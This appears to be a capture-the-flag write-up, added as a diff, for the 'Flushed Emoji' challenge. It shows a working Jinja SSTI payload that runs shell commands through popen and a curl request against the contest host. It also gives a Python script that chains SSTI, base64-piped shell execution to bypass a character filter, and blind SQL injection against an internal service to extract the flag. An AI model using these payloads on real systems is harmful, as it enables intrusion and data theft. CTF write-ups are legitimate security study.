@@ -1,0 +1,74 @@
+## Flushed Emoji
+
+This challenge has several vulnerabilities. The first vulnerability is related to the password field. If you check the code, you will notice the vulnerability of SSTI
+```python
+return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
+```
+
+For example, if you enter the following payload
+```python
+{{2+2}}
+
+4
+```
+
+There is also a sql injection vulnerability in the `data-server` project
+```python
+x = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
+```
+
+Now we use SSTI to execute command
+```python
+{{config['__class__']['__init__']['__globals__']['os']|attr('popen')('ls')|attr('read')()}}
+```
+
+```
+curl -X POST "http://litctf.live:31781" -d "username=&password={{config['__class__']['__init__']['__globals__']['os']|attr('popen')('ls')|attr('read')()}}"
+
+
+ok thank you for your info i have now sold your password (main.py
+requirements.txt
+run.sh
+static
+templates
+) for 2 donuts :)
+```
+
+If we print the main.py file, we will encounter the address http://172.24.0.8:8080/runquery, this address is not accessible from the outside, and this shows that we do not have access to the data-server program from the outside.
+
+In the next step, we should send requests containing sql to the address http://172.24.0.8:8080/runquery
+
+```python
+import requests
+import base64
+
+char = list(".*+,!#$%&0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}")
+
+url = "http://litctf.live:31781"
+internal_url = "http://172.24.0.8:8080/runquery"
+
+ssti_payload  = "{{config['__class__']['__init__']['__globals__']['os']|attr('popen')('%s')|attr('read')()}}"
+rce_payload   = "echo {}| base64 -d | sh"
+python_script = "python3 -c \"import json,requests;print(requests.post('%s', data=json.dumps({'username':'%s','password':'0'}), headers={\\\"Content-type\\\": \\\"application/json\\\"}).text)\""
+sql_payload   = "flag\\'and (Select hex(substr(password,1,{})) from users limit 1 offset 0) = hex(\\\'{}\\\')--"
+
+flag = "LITCTF{"
+
+for c in range(len(char)):
+	for i in range(len(char)):
+		tmp = flag+char[i]
+		
+		script = python_script % (internal_url, sql_payload.format(len(flag)+1,tmp))
+		script = str(base64.b64encode(script.encode("utf-8")), "utf-8")
+		payload = ssti_payload % rce_payload.format(script)
+		
+		r = requests.post(url, data={"username":"","password":payload})
+		if "True" in r.text:
+			flag += char[i]
+			print("FLAG : "+ flag)
+			break
+```
+
+There are a few points in the script above
+	Because there is no curl in the server, we had to use a python script to send the request.
+	The server filters the character “.” , to bypass this filter I coded the script with base64.
